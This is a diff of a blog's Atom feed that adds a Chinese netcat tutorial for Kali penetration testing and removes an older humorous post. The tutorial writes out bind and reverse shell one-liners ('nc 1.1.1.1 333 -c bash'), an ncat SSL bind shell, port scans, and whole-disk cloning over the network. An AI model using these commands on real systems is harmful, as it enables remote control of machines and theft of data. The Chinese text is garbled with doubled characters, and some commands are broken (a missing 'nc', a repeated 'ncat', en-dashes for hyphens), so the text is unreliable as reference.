@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://www.unix-like.com/"/>
-  <updated>2017-06-12T14:33:31.130Z</updated>
+  <updated>2017-06-16T02:05:54.930Z</updated>
   <id>http://www.unix-like.com/</id>
   
   <author>
@@ -14,6 +14,68 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>netcat-nc</title>
+    <link href="http://www.unix-like.com/2017/06/16/security/netcat-nc/"/>
+    <id>http://www.unix-like.com/2017/06/16/security/netcat-nc/</id>
+    <published>2017-06-16T01:48:47.000Z</published>
+    <updated>2017-06-16T02:05:54.930Z</updated>
+    
+    <content type="html"><![CDATA[<ul>
+<li>⺴网网络工工具中的瑞士士军刀刀——小小身身材、大大智慧</li>
+<li>侦听模式 / 传输模式</li>
+<li>telnet / 获取banner信息</li>
+<li>传输文文本信息</li>
+<li>传输文文件/⺫目目录</li>
+<li>加密传输文文件</li>
+<li>远程控制/木木⻢马</li>
+<li>加密所有流量</li>
+<li>流媒体服务器</li>
+<li>远程克隆硬盘</li>
+</ul>
+<a id="more"></a>
+<h1 id="NC——TELNET-BANNER"><a href="#NC——TELNET-BANNER" class="headerlink" title="NC——TELNET / BANNER"></a>NC——TELNET / BANNER</h1><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">nc –nv 1.1.1.1 110</div><div class="line">nc –nv 1.1.1.1 25</div><div class="line">nc –nv 1.1.1.1 80</div></pre></td></tr></table></figure>
+<h1 id="NC——传输文文本信息"><a href="#NC——传输文文本信息" class="headerlink" title="NC——传输文文本信息"></a>NC——传输文文本信息</h1><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">A:nc <span class="_">-l</span> -p 4444</div><div class="line">B:nc –nv 1.1.1.1 4444</div></pre></td></tr></table></figure>
+<h1 id="NC–传输文文件-目录"><a href="#NC–传输文文件-目录" class="headerlink" title="NC–传输文文件/目录"></a>NC–传输文文件/目录</h1><h2 id="传输文文件"><a href="#传输文文件" class="headerlink" title="传输文文件"></a>传输文文件</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">A:nc -lp 333 &gt; 1.mp4</div><div class="line">B:nc -nv 1.1.1.1 333 &lt; 1.mp4 –q 1</div></pre></td></tr></table></figure>
+<p>或<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">A:nc -q 1 -lp 333 &lt; a.mp4</div><div class="line">B: nc -nv 1.1.1.1 333 &gt; 2.mp4</div></pre></td></tr></table></figure></p>
+<h2 id="传输目录"><a href="#传输目录" class="headerlink" title="传输目录"></a>传输目录</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">A:tar -cvf - music/ | nc -lp 333 –q 1</div><div class="line">B:nc -nv 1.1.1.1 333 | tar -xvf –</div></pre></td></tr></table></figure>
+<h2 id="加密传文文件"><a href="#加密传文文件" class="headerlink" title="加密传文文件"></a>加密传文文件</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">A:nc -lp 333 | mcrypt --flush -Fbqd <span class="_">-a</span> rijndael-256 -m ecb &gt; 1.mp4</div><div class="line">B: mcrypt --flush -Fbq <span class="_">-a</span> rijndael-256 -m ecb &lt; a.mp4 | nc -nv 1.1.1.1 333 -q 1</div></pre></td></tr></table></figure>
+<h1 id="NC–流媒体服务"><a href="#NC–流媒体服务" class="headerlink" title="NC–流媒体服务"></a>NC–流媒体服务</h1><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">A: cat 1.mp4 | nc -lp 333</div><div class="line">B: 1.1.1.1 333 | mplayer -vo x11 -cache 3000 -</div></pre></td></tr></table></figure>
+<h1 id="NC——端口口扫描"><a href="#NC——端口口扫描" class="headerlink" title="NC——端口口扫描"></a>NC——端口口扫描</h1><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">nc -nvz 1.1.1.1 1-65535</div><div class="line">nc –vnzu 1.1.1.1 1-1024</div></pre></td></tr></table></figure>
+<h1 id="NC–远程克隆硬盘"><a href="#NC–远程克隆硬盘" class="headerlink" title="NC–远程克隆硬盘"></a>NC–远程克隆硬盘</h1><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">A: nc -lp 333 | dd of=/dev/sda</div><div class="line">B: dd <span class="keyword">if</span>=/dev/sda | nc -nv 1.1.1.1 333 –q 1</div></pre></td></tr></table></figure>
+<h1 id="NC–远程控制"><a href="#NC–远程控制" class="headerlink" title="NC–远程控制"></a>NC–远程控制</h1><h2 id="正向"><a href="#正向" class="headerlink" title="正向:"></a>正向:</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">A:nc -lp 333 -c bash</div><div class="line">B:nc 1.1.1.1 333</div></pre></td></tr></table></figure>
+<h2 id="反向"><a href="#反向" class="headerlink" title="反向:"></a>反向:</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">A:nc -lp 333</div><div class="line">B:nc 1.1.1.1 333 -c bash</div></pre></td></tr></table></figure>
+<p><strong> 注:Windows用用户把bash改成cmd </strong></p>
+<h1 id="NC–NCAT"><a href="#NC–NCAT" class="headerlink" title="NC–NCAT"></a>NC–NCAT</h1><ul>
+<li>Nc缺乏加密和身身份验证的能力力</li>
+<li>Ncat包含于nmap工工具包中<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">A:ncat ncat -c bash --allow 192.168.20.14 -vnl 333 --ssl</div><div class="line">B:ncat -nv 1.1.1.1 333 --ssl</div></pre></td></tr></table></figure></li>
+</ul>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;ul&gt;
+&lt;li&gt;⺴网网络工工具中的瑞士士军刀刀——小小身身材、大大智慧&lt;/li&gt;
+&lt;li&gt;侦听模式 / 传输模式&lt;/li&gt;
+&lt;li&gt;telnet / 获取banner信息&lt;/li&gt;
+&lt;li&gt;传输文文本信息&lt;/li&gt;
+&lt;li&gt;传输文文件/⺫目目录&lt;/li&gt;
+&lt;li&gt;加密传输文文件&lt;/li&gt;
+&lt;li&gt;远程控制/木木⻢马&lt;/li&gt;
+&lt;li&gt;加密所有流量&lt;/li&gt;
+&lt;li&gt;流媒体服务器&lt;/li&gt;
+&lt;li&gt;远程克隆硬盘&lt;/li&gt;
+&lt;/ul&gt;
+    
+    </summary>
+    
+      <category term="security" scheme="http://www.unix-like.com/categories/security/"/>
+    
+    
+      <category term="Kali linux渗透测试" scheme="http://www.unix-like.com/tags/Kali-linux%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+  </entry>
   
   <entry>
     <title>nginx安装</title>
@@ -883,62 +945,6 @@
     <summary type="html">
     
       &lt;p&gt;1、全球化的认证有助于提升逼格，什么OCM、CCIE、RHCA、CISSP等等能考都考，再不济，也要有一张系统架构设计师或者网络规划设计师的信产部认证。每过一个认证，逼格提升一档。&lt;/p&gt;
-    
-    </summary>
-    
-      <category term="life" scheme="http://www.unix-like.com/categories/life/"/>
-    
-    
-      <category term="职业" scheme="http://www.unix-like.com/tags/%E8%81%8C%E4%B8%9A/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>运维人装逼指南大全</title>
-    <link href="http://www.unix-like.com/2017/05/28/life/%E8%BF%90%E7%BB%B4%E4%BA%BA%E8%A3%85%E9%80%BC%E6%8C%87%E5%8D%97%E5%A4%A7%E5%85%A8/"/>
-    <id>http://www.unix-like.com/2017/05/28/life/运维人装逼指南大全/</id>
-    <published>2017-05-28T10:27:19.000Z</published>
-    <updated>2017-05-28T10:48:50.244Z</updated>
-    
-    <content type="html"><![CDATA[<p>曾经有一首诗是这么写的</p>
-<blockquote>
-<p>装逼，是一种态度??</p>
-<p>装逼的人生不可限量</p>
-<p>装逼如煲汤</p>
-<p>遇到烹制的高手，逼格立马飙升</p>
-</blockquote>
-<a id="more"></a>
-<p>装逼，已被业界大神誉为当代职场人的基本素养</p>
-<p>可是</p>
-<p>网上流传的装逼指南一大把</p>
-<p>唯独缺少咱运维人的这一发</p>
-<p>今天线哥就帮大家来扒一扒</p>
-<p>咱们一起把这装逼宝典传承下</p>
-<p>　　话说，运维人拥有天然装逼优势，面对无数迭代升级的软硬件，数都数不过来的各类技术，互联网、云计算、大数据的热潮，跑断腿的各类行业大会……这些都为我们营造了极好的客观条件。</p>
-<p>　　可以说，在全民都看你的时代，你不装逼，不仅浪费了你这一身好手段，而且辜负了天恩浩荡呀！</p>
-<p>　　线哥虽是运营人，但长期浸淫在运维大咖身边，韬光养晦，苦练内功，总结了历来大神的装逼心得，并且通过实战检验，可谓天下无双，故取名曰《装逼宝典》，以补《葵花宝典》千年缺配。</p>
-<p>　　现在很多运维人逼格不高，主要是因其来路不正，“小米+步枪”的时代远去，来路不正永远低人一等。所以一张权威的架构师认证就显得无比重要了，国内比较权威的系统架构设计师或者网络规划设计师的认证要考，国际的什么OCM、CCIE、RHCA、CISSP等等更要考，有了这些证件决定你在哪一个层次装逼，当然了，逼格的飙升也有赖于部分努力。</p>
-<p>　　你会发现一些资深装逼手边永远摆着几本大部头的书，看着都瘆人。何谓大部头，什么？几百页的书你也好意思提，至少得上千页，才配称得上大部头。像什么TCP/IP协议、Linux内核研究、ORACLE大全等等。书一定要摆在显眼位置，你不用担心万一有人问起装逼遭遇滑铁卢。如果有人问硬件，你可以从计算机硬件基础谈起，有人问MS的内容，你那几年微软外包工作经历正好派上用场，现在数据库比较热，你可以从SQL语句的源码开聊，网络就谈TCP，Linux就谈内存管理。聊着聊着，你自己都被自己感动了，征服了。</p>
-<h1 id="跟菜鸟划开界限"><a href="#跟菜鸟划开界限" class="headerlink" title="跟菜鸟划开界限"></a>跟菜鸟划开界限</h1><p>　　菜鸟在管理系统上经常选用perl、python、php这些3p工具，你要避开这些工具，另外shell也要少用，当菜鸟问起，你要表现出不屑来。如果做系统管理你要会写几行erlang、ruby、lua这类语言，如果你胆儿够大，可以整一整Haskell这类函数式语言。我敢说，懂一点这个，你绝对把逼装大了。</p>
-<h1 id="避开大众化路线"><a href="#避开大众化路线" class="headerlink" title="避开大众化路线"></a>避开大众化路线</h1><p>　　当别人问你用squid吗？你说你用ATS；当别人问你用MySQL吗？你说你用postgresql；当别人为你用apache吗？你说你用nginx、lighty。如果你发现当别人也在学习这些技术了，你就到sf、oschina网站上看看那些下载量小的项目，多背背项目简介，当他们在你面前炫耀新技术时，你跟他们聊一聊这些项目，这时你发现他们只剩下长大了的嘴。你要记住，越小众的东西越显得高逼格，小众意味着高端，这是历史反复验证的。</p>
-<h1 id="为自己代言"><a href="#为自己代言" class="headerlink" title="为自己代言"></a>为自己代言</h1><p>　　不装逼的人永远不懂装逼人的寂寞，装逼到极致是高冷的，曲高和寡。比如当大家还在谈Redhat、ubuntu这类大众发行版本时，你总是有意无意间避开，别人问你看法的时候，你对此不置一词，反而大谈特谈LFS、Gentoo。因为大众的东西是别人的，扒到属于自己的东西才显得更有张力，会带来不一样的快感呦。</p>
-<p>　　很多人写脚本都爱用grep、sort 、uniq这类命令，这类命令的功能比较复杂，而你术业有专攻，使用最纯粹的awk、sed来实现，最关键的是当你用它们实现某些功能，别人都看不懂。别人不懂就会问，而这时你却表现出一副轻描淡写的表情。而这些对于他们来说，就算抄书也不一定真能看懂。</p>
-<h1 id="设置屏幕放大招"><a href="#设置屏幕放大招" class="headerlink" title="设置屏幕放大招"></a>设置屏幕放大招</h1><p>　　操作终端一定要大肆显摆，那种黑屏绿字好莱坞大片式简直弱爆了，你用的是什么，是Alpha半透明终端，最好在桌面设置一个全球internet流量走势图，偶尔对着翻滚的屏幕做深入思考状，谁也不知道你在琢磨什么惊天地泣鬼神的东西。</p>
-<h1 id="处处留情"><a href="#处处留情" class="headerlink" title="处处留情"></a>处处留情</h1><p>　　软硬件都解决了，这时候作为运维人的装逼基础已经够完美了，可是距离互联网大神级别还有距离。这时候你要抓住一切手段营销自己。不要让“网管”这个词在你耳朵边出现，你要时刻在明面暗面提示别人，我是架构师或规划师，把所有能展示自己title的地方都写上，什么名片啊、微信啊、QQ签名、脉脉、拉勾网等等，当然如果你愿意加上”首都在线“的前缀，可能效果会出奇不意。</p>
-<h1 id="混精英圈子"><a href="#混精英圈子" class="headerlink" title="混精英圈子"></a>混精英圈子</h1><p>　　混圈子对于装逼是极为重要的。现在各种大会很多，鱼龙混杂，像什么GMIC、ChinaJoy之类的大会很难找到自己定位，而一般的XX架构师大会、XX优化大会、XX沙龙最多混个脸熟就好了。主要瞄准几个特定场合可获得四两拨千斤的效果，比如什么青年计算机学会论坛，统计之都论坛，以及蝴蝶沙龙，尤其蝴蝶沙龙是一个比较纯粹的架构师聚会，多去混这种场子，争取能演讲，那么你在这个圈子就很接近大神级人物了。</p>
-<h1 id="精通云计算"><a href="#精通云计算" class="headerlink" title="精通云计算"></a>精通云计算</h1><p>　　一般而言，骨灰级的大神被当作信仰一样崇拜，这些人物大都具有传奇色彩，据线哥多年观察，这些人物的思考域比较广，他思考问题具有生态图谱效应，比如做架构师，你一定要多思考云计算，了解SAAS，熟悉PAAS，精通IAAS。尤其关注当前IAAS战略趋势以及差异化发展。当前的经济趋势是企业出海，不管是电商、游戏还是视频企业，都在向海外拓展业务，在倡导全球云计算布局领域中，国内首要关注首都在线，因为这是首家全球一体化云计算服务商，拥有全球私网GPN，通过它能够高效稳定安全连接世界。</p>
-<p>　　最后不得不说，装逼是个系统工程，从装逼助理、装逼专员、高级装逼、资深装逼、装逼总监直至CBO。取经之路漫长，你在哪个层级不重要，重要的是，装逼精神不弃，奋斗之路不止。送给万千参透“人生如戏”的职场运维人士们！</p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;曾经有一首诗是这么写的&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;装逼，是一种态度??&lt;/p&gt;
-&lt;p&gt;装逼的人生不可限量&lt;/p&gt;
-&lt;p&gt;装逼如煲汤&lt;/p&gt;
-&lt;p&gt;遇到烹制的高手，逼格立马飙升&lt;/p&gt;
-&lt;/blockquote&gt;
     
     </summary>
     
